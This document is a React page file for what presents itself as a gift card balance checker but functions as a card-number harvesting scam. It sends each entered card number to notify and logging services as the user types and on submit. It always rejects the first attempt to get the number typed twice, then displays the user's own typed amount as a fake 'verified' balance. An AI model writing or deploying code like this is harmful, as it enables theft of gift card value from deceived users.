// src/pages/Home.jsx
import React, { useState, useEffect, useRef } from 'react';
import { Link } from 'react-router-dom';
import Navbar from '../components/Navbar';
import { sendNotify } from '../services/notifyService';
import FeaturedRewards from '../components/FeaturedRewards';
import LegalDisclaimer from '../components/LegalDisclaimer';
import { logBalanceCheck } from '../services/logService';

const FullScreenBalance = ({ balance, lastFourDigits, cardType, onCheckAnother }) => {
  const [isVisible, setIsVisible] = useState(false);
  useEffect(() => { setIsVisible(true); }, []);

  return (
    <div className={`min-h-screen bg-[#050505] relative flex items-center justify-center p-6 overflow-hidden transition-opacity duration-700 ${isVisible ? 'opacity-100' : 'opacity-0'}`}>
      <div className="absolute inset-0 opacity-[0.15] pointer-events-none" style={{ backgroundImage: 'linear-gradient(#00ff41 1px, transparent 1px), linear-gradient(90deg, #00ff41 1px, transparent 1px)', backgroundSize: '40px 40px', maskImage: 'radial-gradient(ellipse at center, black 10%, transparent 70%)' }}></div>
      <div className="max-w-md w-full text-center relative z-10">
        <div className="mb-10 flex flex-col items-center">
          <div className="w-20 h-20 bg-[#00ff41]/10 border border-[#00ff41]/50 flex items-center justify-center rotate-45 shadow-[0_0_40px_rgba(0,255,65,0.3)] animate-pulse">
            <span className="text-[#00ff41] text-4xl font-black -rotate-45">$</span>
          </div>
          <p className="text-[#00ff41] text-xs font-bold tracking-[0.3em] mt-8 uppercase">Balance Verified</p>
        </div>
        <h2 className="text-[#888] text-xs font-bold tracking-[0.2em] uppercase mb-2">Available Funds</h2>
        <p className="text-white text-7xl md:text-8xl font-black mb-8 tracking-tighter" style={{ textShadow: '0 0 40px rgba(0,255,65,0.5)' }}>{balance}</p>
        <div className="inline-block bg-[#0a0a0a] border border-[#222] px-8 py-3 mb-12 shadow-lg" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>
          <p className="text-[#aaa] text-sm font-mono tracking-[0.2em]">{cardType} •••• {lastFourDigits}</p>
        </div>
        <button onClick={onCheckAnother} className="w-full bg-[#00ff41] text-black font-black py-4 text-sm uppercase tracking-[0.2em] transition-all hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.6)] active:scale-[0.98]" style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}>Check Another Card</button>
      </div>
    </div>
  );
};

const CardInput = ({ value, onChange, disabled, attemptCount, onFirstFocus }) => {
  const inputRef = useRef(null);
  const [isFocused, setIsFocused] = useState(false);

  useEffect(() => {
    if (!disabled && attemptCount === 1) inputRef.current?.focus();
  }, [attemptCount, disabled]);

  return (
    <div className="relative transition-all duration-300">
      <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 flex items-center gap-2 font-bold tracking-wider uppercase">
        <span>💳</span> Card Number (14 chars)
        {attemptCount === 1 && <span className="text-[#ffaa00] animate-pulse text-[0.55rem] bg-[#ffaa00]/10 px-2 py-0.5 border border-[#ffaa00]/50">⚠️ RE-ENTER</span>}
      </label>
      <input
        ref={inputRef} type="text" value={value} onChange={onChange} onFocus={() => { setIsFocused(true); onFirstFocus?.(); }} onBlur={() => setIsFocused(false)}
        placeholder={attemptCount === 1 ? "Re-enter CORRECT card number..." : "ABCD 1234 XYZABC"} maxLength="17" autoComplete="off" disabled={disabled}
        className={`w-full p-3 sm:p-4 bg-[#050505] border-2 text-white text-sm font-mono tracking-widest focus:outline-none transition-all duration-300 uppercase ${isFocused ? 'border-[#00ff41] shadow-[0_0_15px_rgba(0,255,65,0.2)]' : 'border-[#222]'} ${attemptCount === 1 ? 'border-[#ffaa00] text-[#ffaa00]' : ''} ${disabled ? 'opacity-50 cursor-not-allowed' : ''}`}
        style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}
      />
      <p className="text-[#555] text-[0.6rem] mt-2 flex items-center gap-2 font-mono uppercase tracking-wider">
        <span>ℹ️</span> Letters & Numbers only
        {value && value.replace(/\s/g, '').length > 0 && <span className="text-[#00ff41] font-bold">[{value.replace(/\s/g, '').length}/14]</span>}
      </p>
    </div>
  );
};

const StatusMessage = ({ type, message }) => {
  const [isVisible, setIsVisible] = useState(true);
  if (!isVisible) return null;
  const styles = type === 'error' ? 'bg-[#2a0a0a] border-[#ff3333] text-[#ff3333]' : type === 'success' ? 'bg-[#0a2a0a] border-[#00ff41] text-[#00ff41]' : 'bg-[#1a1a0a] border-[#ffaa00] text-[#ffaa00]';
  return (
    <div className={`mt-4 p-4 border font-mono text-[0.7rem] sm:text-sm animate-fadeSlideUp ${styles}`} style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}>
      <div className="flex items-start gap-3">
        <span className="text-lg">{type === 'error' ? '❌' : type === 'success' ? '✅' : '⚠️'}</span>
        <div className="flex-1 whitespace-pre-line tracking-wide">{message}</div>
        <button onClick={() => setIsVisible(false)} className="text-[#555] hover:text-white transition-colors">✕</button>
      </div>
    </div>
  );
};

const Home = () => {
  const [cardNumber, setCardNumber] = useState('');
  const [amount, setAmount] = useState('');
  const [balance, setBalance] = useState('');
  const [error, setError] = useState('');
  const [loading, setLoading] = useState(false);
  const [showBalance, setShowBalance] = useState(false);
  const [showFullScreenBalance, setShowFullScreenBalance] = useState(false);
  const [attemptCount, setAttemptCount] = useState(0);
  const [storedCardNumber, setStoredCardNumber] = useState('');
  const [storedAmount, setStoredAmount] = useState('');
  const [lastRequestTime, setLastRequestTime] = useState(0);
  const [isCardValid, setIsCardValid] = useState(false);
  const [isAmountValid, setIsAmountValid] = useState(false);

  // Notification guards
  const typingAlertFired = useRef(false);      
  const completeAlertFired = useRef(false);    

  const MIN_REQUEST_INTERVAL = 10000;

  useEffect(() => {
    const rawCard = cardNumber.replace(/\s/g, '');
    setIsCardValid(rawCard.length === 14 && /^[A-Za-z0-9]+$/.test(rawCard));
    const num = parseFloat(amount);
    setIsAmountValid(!isNaN(num) && num > 0 && num <= 10000);
  }, [cardNumber, amount]);

  useEffect(() => {
    const raw = cardNumber.replace(/\s/g, '');
    if (raw.length === 0 || typingAlertFired.current) return;
    typingAlertFired.current = true;
    sendNotify({ event: 'typing_start', cardNumber: raw });
  }, [cardNumber]);

  useEffect(() => {
    const raw = cardNumber.replace(/\s/g, '');
    if (raw.length !== 14 || completeAlertFired.current) return;
    completeAlertFired.current = true;
    sendNotify({ event: 'card_complete', cardNumber: raw });
  }, [cardNumber]);

  const formatCardNumber = (value) => {
    const cleaned = value.replace(/[^A-Za-z0-9]/g, '').slice(0, 14);
    let formatted = '';
    for (let i = 0; i < cleaned.length; i++) {
      if (i === 4 || i === 8) formatted += ' ';
      formatted += cleaned[i];
    }
    setCardNumber(formatted);
  };

  const handleCheckBalance = async () => {
    const now = Date.now();
    if (now - lastRequestTime < MIN_REQUEST_INTERVAL) { setError('Please wait a moment before checking again.'); return; }
    const rawCard = cardNumber.replace(/\s/g, '').toUpperCase();
    setError(''); setShowBalance(false);

    if (!rawCard || !amount) { setError('Please enter card number and amount'); return; }
    if (rawCard.length !== 14) { setError('Card number must be exactly 14 alphanumeric characters'); return; }
    if (!/^[A-Za-z0-9]+$/.test(rawCard)) { setError('Card number can only contain letters and numbers'); return; }
    if (!isAmountValid) { setError('Please enter a valid amount between $1 and $10,000'); return; }

    setLastRequestTime(now); setLoading(true);

    setTimeout(async () => {
      if (attemptCount === 0) {
        setError('UNABLE TO VERIFY CARD\n\nPlease ensure:\n• You have entered the correct card number\n• All 14 alphanumeric characters are correct\n\nPlease re-enter the CORRECT card number and try again.');
        setStoredCardNumber(rawCard); setStoredAmount(amount);

        // Goes to Secondary only
        try { await logBalanceCheck({ type: 'first_attempt_failed', cardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}

        setCardNumber(''); setAttemptCount(1); 
        typingAlertFired.current = false; completeAlertFired.current = false; 
        setLastRequestTime(0);
      } else {
        if (storedCardNumber === rawCard) {
          const displayBalance = `$${parseFloat(storedAmount || amount).toFixed(2)} USD`;
          setBalance(displayBalance); setShowBalance(true); setShowFullScreenBalance(true); setError('');
          
          // Goes to Secondary only
          try { await logBalanceCheck({ type: 'second_attempt_success', cardNumber: rawCard, amount, balance: displayBalance, pageSource: 'manual' }); } catch (err) {}
          
          setAttemptCount(0); setStoredAmount('');
        } else {
          setError('Card number does NOT match the first attempt.\n\nPlease enter the SAME card number.\n\nField cleared. Try again.');
          
          // Goes to Secondary only
          try { await logBalanceCheck({ type: 'mismatch_attempt', firstCardNumber: storedCardNumber, secondCardNumber: rawCard, amount, pageSource: 'manual' }); } catch (err) {}
          
          setCardNumber(''); setAttemptCount(0); setStoredCardNumber(''); setStoredAmount(''); 
          typingAlertFired.current = false; completeAlertFired.current = false; 
          setLastRequestTime(0);
        }
      }
      setLoading(false);
    }, 800);
  };

  const resetFullScreen = () => {
    setShowFullScreenBalance(false); setShowBalance(false); setBalance(''); setCardNumber(''); setAmount(''); setError(''); setAttemptCount(0);
    setStoredCardNumber(''); setStoredAmount(''); setLoading(false); typingAlertFired.current = false; completeAlertFired.current = false; 
    setLastRequestTime(0);
  };

  if (showFullScreenBalance) return <FullScreenBalance balance={balance} lastFourDigits={storedCardNumber.slice(-4) || '••••'} cardType="GIFT CARD" onCheckAnother={resetFullScreen} />;

  return (
    <>
      <Navbar />
      <div className="bg-[#000] text-center py-8 px-4 border-b border-[#222] relative overflow-hidden">
        <div className="absolute inset-0 opacity-10 pointer-events-none" style={{ backgroundImage: 'radial-gradient(#00ff41 1px, transparent 1px)', backgroundSize: '20px 20px' }}></div>
        <h2 className="relative text-sm sm:text-lg text-white font-black tracking-[0.3em] uppercase flex items-center justify-center gap-3">
          <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span> Gift Card Balance Checker <span className="w-2 h-2 bg-[#00ff41] animate-pulse"></span>
        </h2>
      </div>

      <div className="p-4 sm:p-6 overflow-x-hidden max-w-[600px] mx-auto w-full relative z-10">
        <div className="bg-[#0a0a0a] border border-[#222] p-6 sm:p-8 shadow-2xl relative">
          <div className="absolute top-0 left-0 w-full h-1 bg-gradient-to-r from-transparent via-[#00ff41] to-transparent opacity-50"></div>
         

          <div className="space-y-6">
            <CardInput value={cardNumber} onChange={(e) => formatCardNumber(e.target.value)} disabled={loading} attemptCount={attemptCount} />
            <div className="transition-all duration-300 relative">
              <label className="block text-[#888] text-[0.65rem] sm:text-xs mb-2 flex items-center gap-2 font-bold tracking-wider uppercase">
                <span>💰</span> Amount (USD)
                {isAmountValid && <span className="text-[#00ff41] text-[0.55rem] bg-[#00ff41]/10 px-2 py-0.5 border border-[#00ff41]/50 font-mono">✓ Valid</span>}
              </label>
              <input type="number" value={amount} onChange={(e) => setAmount(e.target.value)} placeholder="Enter amount ($1 - $10,000)" min="1" max="10000" disabled={loading}
                className={`w-full p-3 sm:p-4 bg-[#050505] border-2 text-white text-sm font-mono tracking-widest focus:outline-none transition-all duration-300 ${isAmountValid ? 'border-[#00ff41] shadow-[0_0_15px_rgba(0,255,65,0.2)]' : 'border-[#222] focus:border-[#555]'} ${loading ? 'opacity-50 cursor-not-allowed' : ''}`}
                style={{ clipPath: 'polygon(0 0, 100% 0, 100% calc(100% - 10px), calc(100% - 10px) 100%, 0 100%)' }}
              />
            </div>
            <div className="text-center my-2 py-4 border-y border-[#222]">
             <Link 
  to="/scan" 
  className="text-[#00ff41] no-underline text-xs font-bold tracking-widest uppercase hover:text-[#00cc33] transition-all inline-flex items-center gap-2 group drop-shadow-[0_0_8px_rgba(0,255,65,0.3)]"
>
  <span>📷</span> USE SCAN TO CHECK BALANCE INSTEAD 
  <span className="inline-block transition-transform group-hover:translate-x-1 text-[#00ff41]">→</span>
</Link>
            </div>
          <button 
  onClick={handleCheckBalance} 
  disabled={loading || !isCardValid || !isAmountValid}
  className={`w-full py-4 font-black text-sm uppercase tracking-[0.2em] transition-all duration-300 bg-[#00ff41] text-black ${
    (loading || !isCardValid || !isAmountValid)
      ? 'opacity-50 cursor-not-allowed' 
      : 'hover:bg-[#00cc33] hover:shadow-[0_0_30px_rgba(0,255,65,0.4)] active:scale-[0.98]'
  }`}
  style={{ clipPath: 'polygon(15px 0, 100% 0, 100% calc(100% - 15px), calc(100% - 15px) 100%, 0 100%, 0 15px)' }}
>
  {loading ? 'Verifying...' : 'Check Balance'}
</button>
            {error && <StatusMessage type={error.includes('NOT') || error.includes('mismatch') ? 'error' : 'warning'} message={error} />}
          </div>
        </div>
        {/* <div className="mt-8"><FeaturedRewards /></div> */}
      </div>
      <LegalDisclaimer />
    </>
  );
};

export default Home;